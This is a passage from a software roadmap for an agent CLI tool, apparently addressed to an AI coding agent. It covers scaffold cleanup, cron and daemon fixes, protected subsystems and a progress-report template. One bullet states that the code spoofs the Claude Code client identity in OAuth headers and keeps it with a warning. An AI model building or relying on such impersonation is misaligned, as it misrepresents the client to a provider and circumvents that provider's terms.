- `src/auth/anthropic-oauth.mjs:130-150` — pasted-CODE#STATE hand parsing → proper redirect/device flow; **the Claude Code identity spoofing (`src/providers/anthropic-oauth-headers.mjs:11-35`, `src/auth/anthropic-oauth.mjs:29`) gets a SCAFFOLD marker and a visible doctor WARN — it is a ToS-fragile external dependency, and the system must degrade honestly to API-key auth when it breaks**
- `src/providers/role-router.mjs:73-80,103-110` — draft-first-turn model swapping → cost policy from the Phase 5.9 catalog
- `src/providers/discovery.mjs:20-21,38-41` — NON_CHAT_RE model-id regex → catalog modality flags
- `src/providers/failover-router` error-message regex classification → status-code + typed error taxonomy (keep message regex only as SCAFFOLD fallback)
- verify-pass VERIFY_OK/VERIFY_REVISE prose-sentinel protocol → structured output tool call
- eval scorer surface-form assertions (done in Phase 0.9 — verify complete)
- computer-plane heuristics from 6.6 — resolve each

**DoD Phase 8:** for each bullet: commit referencing this list; `npm test` green after each deletion; final `grep -rn "SCAFFOLD" src/ | wc -l` and full list pasted into the progress ledger; R15 green.

### Phase 9 — Ops & daemon lifecycle

| # | Defect | Evidence | Fix shape |
|---|---|---|---|
| 9.1 | Cron jobs in-memory Map only — all schedules lost on restart (systemd says Restart=always) | `src/cron/scheduler.mjs:17` | Persist schedule definitions (JSON/SQLite); rehydrate on boot; missed-while-down policy (skip/catch-up) explicit per job |
| 9.2 | Homegrown 2-of-5-field cron parser silently mis-schedules | `src/cron/schedule.mjs:22-46` | Full 5-field parser with tests over a validity corpus, or vendor a tiny well-tested one; reject-with-error what it can't parse (never silently) |
| 9.3 | `xclaw daemon unit` only prints unit text; watchdog restarts via nohup outside supervision | `bin/xclaw.mjs:1054-1061`; `scripts/watchdog.sh` | `daemon install/uninstall/status` (systemd first); watchdog defers to the supervisor when one is present |
| 9.4 | Alerting singleton wiring gap via `getSharedAlerter` in scheduler | `src/alerting/alerts.mjs:272-276`; `src/cron/scheduler.mjs:109` | One alerter instance injected, not looked up; alert on job failure + restart-recovery |

**DoD Phase 9:** R16 test (schedule → SIGKILL → restart → fires; use 1s-interval test job); cron parser property tests (every documented field form); `xclaw daemon install --dry-run` prints the exact actions; `npm test` green.

---

## 6. Crown jewels — protected surfaces (never regress)

1. **Plan-fingerprint approval binding** — after Phase 1 it is the enforcement spine. Every later phase's exec-path change must keep T1–T5 green.
2. **Receipts-as-gates** — Phase 2.7 upgrades receipts to trace-derived; the receipts→merge-gate coupling itself is the differentiator. Keep it.
3. **Context-economics pipeline** (offload, prefix-stability, adaptive eviction) — Phase 3.1 threads history through it; do not fork a second context path.
4. **Resumable jobs / checkpointing** — extend (Phase 2.6 swarm journal), never bypass.
5. **The honest doctor** — every phase that adds an external dependency adds a doctor check that degrades with WARN, not crash.
6. **The 200-file test suite** — count only goes up. A PR that deletes tests must replace them 1:1 with stronger ones and say so.

---

## 7. Reporting

End every work session by updating `docs/GROK-PROGRESS.md`:

```
## <date> — Phase <n>.<m>
STATUS: red|amber|green
BUILT: <what changed, one line>
RAN: <commands + result digests — real output, no summaries of summaries>
RUBRIC: <current n>/18 green
UNVERIFIED: <anything claimed but not exercised>
NEXT: <the exact next package>
```

The rubric number at the top of the ledger is the single source of truth for "how close to 10/10". It only moves when a proof command passes. When it reaches 18/18, run the entire §3 table once more, top to bottom, on a fresh clone — and only then write the words "10/10".
